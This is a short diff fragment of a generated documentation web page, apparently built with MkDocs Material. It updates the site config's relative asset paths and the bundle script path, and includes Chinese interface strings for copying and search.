+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.sections"], "search": "../../../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.2a6f1dda.min.js"></script>
+      <script src="../../../../assets/javascripts/bundle.2a6f1dda.min.js"></script>
       
     
   </body>
